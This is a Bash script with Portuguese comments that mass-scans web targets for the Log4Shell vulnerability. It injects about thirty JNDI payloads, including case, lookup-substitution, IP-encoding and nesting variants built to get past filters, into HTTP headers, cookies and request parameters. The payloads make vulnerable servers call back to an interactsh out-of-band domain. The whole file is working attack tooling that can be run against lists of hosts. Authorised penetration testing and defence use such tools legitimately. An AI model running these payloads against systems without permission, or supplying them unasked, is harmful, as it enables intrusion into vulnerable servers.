#!/bin/bash

# Captura parâmetros
TARGET=""
IACT_DOMAIN=""
METHOD=""
DATA=""
TARGET_FILE=""

for ((i=1; i<=$#; i++)); do
  arg="${!i}"
  if [[ "$arg" == "-i" ]]; then
    j=$((i+1)); IACT_DOMAIN="${!j}"
  elif [[ "$arg" == "-f" ]]; then
    j=$((i+1)); TARGET_FILE="${!j}"
  elif [[ "$arg" == "-m" ]]; then
    j=$((i+1)); METHOD="${!j}"
  elif [[ "$arg" == "-d" ]]; then
    j=$((i+1)); DATA="${!j}"
  elif [[ "$arg" == http* ]]; then
    TARGET="$arg"
  fi
done

if [ -z "$IACT_DOMAIN" ]; then
  echo "Uso:"
  echo "  Headers/Cookie:  bash log4shell.sh https://alvo -i DOMINIO.oast.pro"
  echo "  GET:             bash log4shell.sh https://alvo -i DOMINIO.oast.pro -m GET -d 'param=PAYLOAD'"
  echo "  POST:            bash log4shell.sh https://alvo -i DOMINIO.oast.pro -m POST -d 'username=PAYLOAD&password=123'"
  echo "  Lista:           bash log4shell.sh -f targets.txt -i DOMINIO.oast.pro"
  exit 1
fi

# Timestamp
ts() { date '+%Y-%m-%d %H:%M:%S'; }

# Todos os payloads Log4Shell
build_payloads() {
  local domain=$1
  local id=$2

  PAYLOADS=(
    # Básicos por protocolo
    "\${jndi:ldap://$domain/$id-ldap}"
    "\${jndi:ldaps://$domain/$id-ldaps}"
    "\${jndi:rmi://$domain/$id-rmi}"
    "\${jndi:dns://$domain/$id-dns}"
    "\${jndi:iiop://$domain/$id-iiop}"
    "\${jndi:http://$domain/$id-http}"

    # Bypass case
    "\${jndi:LDAP://$domain/$id-case1}"
    "\${jndi:Ldap://$domain/$id-case2}"
    "\${JnDi:ldap://$domain/$id-case3}"
    "\${JNDI:LDAP://$domain/$id-case4}"

    # Bypass lower/upper
    "\${jndi:\${lower:l}dap://$domain/$id-lower1}"
    "\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://$domain/$id-lower2}"
    "\${jndi:\${upper:l}dap://$domain/$id-upper1}"
    "\${\${lower:j}ndi:ldap://$domain/$id-lower3}"
    "\${\${upper:j}ndi:ldap://$domain/$id-upper2}"

    # Bypass substituição
    "\${j\${::-n}di:ldap://$domain/$id-sub1}"
    "\${j\${lower:n}di:ldap://$domain/$id-sub2}"
    "\${jn\${::-d}i:ldap://$domain/$id-sub3}"
    "\${jnd\${::-i}:ldap://$domain/$id-sub4}"
    "\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://$domain/$id-sub5}"

    # Bypass IP
    "\${jndi:ldap://2130706433/$id-decimal}"
    "\${jndi:ldap://0177.0.0.1/$id-octal}"
    "\${jndi:ldap://[::1]/$id-ipv6}"
    "\${jndi:ldap://127.0.0.1#$domain/$id-hash}"
    "\${jndi:ldap://$domain@127.0.0.1/$id-at}"

    # Bypass nested
    "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://$domain/$id-nested1}"
    "\${\${upper:j}\${upper:n}\${upper:d}\${upper:i}:ldap://$domain/$id-nested2}"
    "\${\${::-j}ndi:\${::-l}dap://$domain/$id-nested3}"
  )
}

scan_log4shell() {
  local url=$1
  local proto=$2

  if [ "$proto" == "HTTPS" ]; then
    CURL_FLAGS="-skL"
  else
    CURL_FLAGS="-sL"
  fi

  # ID único por host para identificar no interactsh
  local host_id=$(echo "$url" | sed 's|https\?://||' | sed 's|[^a-zA-Z0-9]|-|g' | cut -c1-20)

  echo ""
  echo "==============================="
  echo "[*] $proto → $url"
  echo "==============================="

  # Constrói payloads
  build_payloads "$IACT_DOMAIN" "$host_id"

  # Headers testados
  HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Forwarded-Host" "X-Originating-IP" "X-Real-IP" "CF-Connecting-IP" "True-Client-IP" "X-Custom-IP-Authorization")

  # Cookies testados
  COOKIES=("session" "token" "auth" "user" "username" "JSESSIONID" "PHPSESSID" "remember_me")

  echo ""
  echo "=== Headers ==="
  for header in "${HEADERS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
      TS=$(ts)
      code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
        -H "$header: $payload" "$url")
      echo "[$TS][$code] $header: $payload"
    done
  done

  echo ""
  echo "=== Cookies ==="
  for cookie in "${COOKIES[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
      TS=$(ts)
      code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
        -H "Cookie: $cookie=$payload" "$url")
      echo "[$TS][$code] Cookie $cookie: $payload"
    done
  done

  # GET/POST se informado
  if [ -n "$METHOD" ] && [ -n "$DATA" ]; then
    echo ""
    echo "=== $METHOD Params ==="
    for payload in "${PAYLOADS[@]}"; do
      TS=$(ts)
      # Substitui PAYLOAD no --data pelo payload atual
      injected_data=$(echo "$DATA" | sed "s|PAYLOAD|$payload|g")

      if [ "$METHOD" == "GET" ]; then
        code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
          -G --data-urlencode "$injected_data" "$url")
      else
        code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
          -X POST --data "$injected_data" "$url")
      fi
      echo "[$TS][$code] $METHOD → $injected_data"
    done
  fi
}

run_scan() {
  local target=$1
  local host=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)

  echo ""
  echo "##################################"
  echo "# TARGET: $target"
  echo "##################################"

  if [[ "$target" == https* ]]; then
    scan_log4shell "$target" "HTTPS"
  elif [[ "$target" == http://* ]]; then
    scan_log4shell "$target" "HTTP"
    scan_log4shell "https://$host" "HTTPS"
  else
    scan_log4shell "http://$host" "HTTP"
    scan_log4shell "https://$host" "HTTPS"
  fi
}

# Execução
LOG="log4shell_$(date +%Y%m%d_%H%M%S).txt"

if [ -n "$TARGET_FILE" ]; then
  if [ ! -f "$TARGET_FILE" ]; then
    echo "[!] Arquivo não encontrado: $TARGET_FILE"
    exit 1
  fi
  total=$(wc -l < "$TARGET_FILE")
  count=0
  while IFS= read -r target || [ -n "$target" ]; do
    [[ -z "$target" || "$target" == \#* ]] && continue
    count=$((count+1))
    echo "[*] Progresso: $count/$total — $(ts)"
    run_scan "$target" | tee -a "$LOG"
  done < "$TARGET_FILE"
else
  run_scan "$TARGET" | tee -a "$LOG"
fi

echo ""
echo "[*] Scan finalizado — $(ts)"
echo "[*] Log salvo em: $LOG"
echo "[*] Verifique callbacks no interactsh-client"
